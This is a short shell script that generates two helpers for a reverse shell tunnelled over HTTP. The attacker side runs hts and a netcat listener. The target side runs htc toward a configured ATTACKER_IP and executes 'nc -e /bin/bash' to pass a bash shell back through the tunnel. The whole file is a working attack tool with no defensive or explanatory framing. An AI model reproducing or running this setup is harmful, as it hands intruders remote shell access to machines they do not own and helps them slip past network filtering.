# Variables, configure as needed
ATTACKER_BIND_PORT=4444
ATTACKER_HTTP_TUNNEL_PORT=4445

ATTACKER_IP=192.168.199.166       # IP to send the reverse shell to

TARGET_BIND_PORT=4444
TARGET_SHELL_PATH=/bin/bash

# Generate attacker.sh
echo hts --forward-port localhost:$ATTACKER_BIND_PORT $ATTACKER_HTTP_TUNNEL_PORT > attacker.sh
echo nc -nlvp $ATTACKER_BIND_PORT >> attacker.sh
chmod +x attacker.sh

# Generate target.sh
echo htc --forward-port $TARGET_BIND_PORT $ATTACKER_IP:$ATTACKER_HTTP_TUNNEL_PORT > target.sh
echo nc -e /bin/bash localhost $TARGET_BIND_PORT >> target.sh
chmod +x target.sh
